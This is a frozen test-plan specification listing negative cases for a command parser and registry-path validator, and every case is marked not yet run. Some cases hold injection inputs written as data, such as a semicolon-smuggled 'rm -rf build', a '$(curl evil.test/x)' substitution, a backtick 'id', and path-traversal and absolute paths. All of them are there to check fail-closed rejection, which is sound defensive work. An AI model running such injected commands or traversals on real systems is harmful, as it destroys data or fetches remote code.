# Validator Specs — negative-case matrices (A07 + deterministic verification §1–§2)

Status: `FROZEN (spec)` / `NOT_RUN (execution)`
Frozen: M1, 2026-11-22
Transcribed from: `DETERMINISTIC-VERIFICATION.md §1–§2`, `REGISTRY-CONTRACT.md`,
`SECURITY-AND-SAFETY.md` (R1 bundle, manifest-verified).

Every case below is a **test plan of record**, not a result. M1 defines the matrix; M2+ executes it.
Each case gets a stable ID so an M2 test can be traced back to this table. The companion JSON
artifacts are `status: NOT_RUN` with `deferred_to: M2` — a reviewer can mechanically prove M1 did
not fabricate execution evidence.

Rule for reading these tables: a case whose "Required outcome" is not a concrete, observable
outcome is an incomplete spec and must be rejected at review.

## 1. Parser safety (`PS-*`)

Rule source: `DETERMINISTIC-VERIFICATION.md §1`. `$ARGUMENTS` is parsed from the prompt; mode and
flags are never interpolated into Bash/PowerShell; a `Command:` string is never executed.

| ID | Input class | Required outcome | Evidence artifact |
|---|---|---|---|
| PS-01 | Unknown mode, e.g. `/e2e frobnicate src/` | Fail closed: usage message listing the 6 modes, no Read/Write/Browser action | parser-failclosed.report.json |
| PS-02 | Conflicting modes, e.g. `/e2e map run TEST-E2E-001` | Fail closed: "one mode per invocation", no mode selected | parser-failclosed.report.json |
| PS-03 | Duplicate flags, e.g. `/e2e run --ad-hoc --ad-hoc TEST-E2E-001` | Fail closed: duplicate flag rejected, no execution | parser-failclosed.report.json |
| PS-04 | Empty/whitespace `$ARGUMENTS` after `run` | Resolve to no-args mode (read-only preview), never to `run` with an empty target | parser-failclosed.report.json |
| PS-05 | Shell-metacharacter injection, e.g. `/e2e run TEST-E2E-001; rm -rf build` | Fail closed: token rejected before any shell boundary; nothing executed | prompt-injection.report.json |
| PS-06 | Command substitution, e.g. `/e2e run $(curl evil.test/x)` | Fail closed: no interpolation, no network | prompt-injection.report.json |
| PS-07 | Backtick substitution, e.g. ``/e2e run `id` `` | Fail closed: literal text only, no evaluation | prompt-injection.report.json |
| PS-08 | Newline smuggling, e.g. `run TEST-E2E-001\nrun --ad-hoc other` | Fail closed: a single mode per invocation; embedded newline cannot add a mode | parser-failclosed.report.json |
| PS-09 | `Command:` in `TESTS.md` containing shell text | Never executed; `Command` treated as untrusted data, `Invocation` built separately | command-not-executed.trace.json |

## 2. Registry path (`RP-*`)

Rule source: `DETERMINISTIC-VERIFICATION.md §2`. `.governance/docs-map.json` is honoured only when
valid **and** inside the repo; otherwise root `TESTS.md`.

| ID | Input class | Required outcome | Evidence artifact |
|---|---|---|---|
| RP-01 | Absolute registry path, e.g. `/etc/TESTS.md` | Reject, fall back per §2, no write outside repo | registry-path.reject.json |
| RP-02 | Parent traversal, e.g. `../../TESTS.md` | Reject: path escapes workspace; no read or write follows | registry-path.reject.json |
| RP-03 | Symlinked `TESTS.md` pointing outside the repo | Reject on resolved-realpath check, before any write | symlink-escape.reject.json |
| RP-04 | Workspace escape via docs-map mapping to an external dir | Reject; docs-map is untrusted data, not an instruction | registry-path.reject.json |
| RP-05 | Dual-location conflict: `TESTS.md` and docs-map disagree | STOP and surface the conflict; do not pick a winner | registry-path.reject.json |
| RP-06 | `Test file` field absolute or containing `..` | Reject the spec path; keep the registry untouched | registry-path.reject.json |

## 3. Symlink / artifact escape (`SE-*`)

| ID | Input class | Required outcome | Evidence artifact |
|---|---|---|---|
| SE-01 | Evidence artifact path that is a symlink outside the scoped root | Fail closed: artifact not cited, run not `covered` | symlink-escape.reject.json |
| SE-02 | Artifact path that resolves outside the scoped ignored root | Reject before citing; evidence invalid | symlink-escape.reject.json |
| SE-03 | Spec file is a symlink escaping the repo | Reject at preflight; no execution | symlink-escape.reject.json |
| SE-04 | Registry block's `Evidence` points at a nonexistent path | Evidence invalid; status cannot be `covered` | symlink-escape.reject.json |

## 4. State enum / `stale` schema mismatch (spec only)

`stale` is an **assessment** classification, not a Registry `State`
(`REGISTRY-CONTRACT.md` "Stale assessment").

| Condition | Required behaviour |
|---|---|
| Row carries `State: stale` | Schema mismatch. Propose the correction; never migrate silently. `PENDING_DEC DEC-12` |
| Row is `covered` but its evidence went invalid | Propose `State: unverified` — not `stale` |
| Row is `covered` but the route is gone | Assessment becomes `stale`; the `State` change is proposed separately |
| Any `State` value outside the 5 controlled values | Reject the row as invalid; do not normalise it |

Executed by: `stale-assessment.report.json` (scenario B10) — `NOT_RUN`, deferred to M2.

## 5. Concurrency (spec only)

| Condition | Required outcome |
|---|---|
| Registry bytes change between diff and write | `WRITE_CONFLICT`; recompute diff; re-approval. Never last-writer-wins |
| Registry hash re-read immediately before write mismatches | Abort the write; owner bytes intact |

Executed by: `concurrency.report.json` (scenario B12) — `NOT_RUN`, deferred to M2.

## 6. Coverage of §1–§2 rules

| Rule (DETERMINISTIC-VERIFICATION) | Cases |
|---|---|
| §1 unknown/conflicting mode → fail closed | PS-01, PS-02 |
| §1 duplicate flags → fail closed | PS-03 |
| §1 injection tokens → fail closed | PS-05, PS-06, PS-07, PS-08 |
| §1 no shell interpolation of `$ARGUMENTS` | PS-05, PS-06, PS-07, PS-09 |
| §1 `Command:` never executed | PS-09 |
| §2 resolve docs-map only when valid and in-repo | RP-04, RP-05 |
| §2 reject absolute / `..` / symlink / workspace escape | RP-01, RP-02, RP-03, RP-04, RP-06, SE-01, SE-02, SE-03 |
| §2 dual-location conflict → STOP | RP-05 |

Case count: 9 PS + 6 RP + 4 SE = **19** defined cases. All `NOT_RUN`.
